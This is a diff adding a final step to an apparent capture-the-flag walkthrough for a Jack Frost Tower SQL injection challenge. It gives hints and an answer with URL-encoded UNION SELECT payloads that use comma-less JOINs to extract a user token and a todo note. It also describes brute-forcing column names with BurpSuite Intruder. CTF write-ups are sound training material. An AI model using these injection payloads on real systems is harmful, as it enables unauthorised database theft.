@@ -109,3 +109,30 @@ print('DONE')
   Use comma-less JOINs for arbitrary data SELECTs.
   https://staging.jackfrosttower.com/detail/1,1%20union%20select%20*%20from%20((select%201)A%20join%20(select%20token%20from%20users%20where%20id%20=1)B%20join%20(select%20%22%22)C%20join%20(select%20%22%22)D%20join%20(select%20%22%22)E%20join%20(select%20%22%22)F%20join%20(select%20%22%22)G)--
 </details>
+
+5. Exploit the second vulnerability...for the final answer!
+<details>
+  <summary>Hint 1</summary>
+  Where could the todo list be? Enumerate the DB tables using the JOINs above.
+</details>
+
+<details>
+  <summary>Hint 2</summary>
+  The DB likely blocks FUNCTION calls and the INFORMATION_SCHEMA.COLUMNS table, so you have to bruteforce/enum the col names manually - or with BurpSuite Intruder!
+</details>
+
+<details>
+  <summary>Answer</summary>
+  Run this through BurpSuite Intruder
+ 
+  /detail/1,1%20union%20select%20*%20from%20((select%201)A%20join%20(%20SELECT%20§1§%20FROM%20todo)B%20join%20(select%20%22%22)C%20join%20(select%20%22%22)D%20join%20(select%20%22%22)E%20join%20(select%20%22%22)F%20join%20(select%20%22%22)G)--
+  
+  And set the inject point to the "1" (already done in example above) in the "select 1 from todo" query. I used this wordlist:
+  
+  https://github.com/drtychai/wordlists/blob/master/sqlmap/common-columns.txt 
+  
+  Then I filtered results by length and found the two largest were id and note.
+  Answer:
+  
+  https://staging.jackfrosttower.com/detail/1,1%20union%20select%20*%20from%20((select%201)A%20join%20(%20SELECT%20note%20FROM%20todo)B%20join%20(select%20%22%22)C%20join%20(select%20%22%22)D%20join%20(select%20%22%22)E%20join%20(select%20%22%22)F%20join%20(select%20%22%22)G)--
+</details>
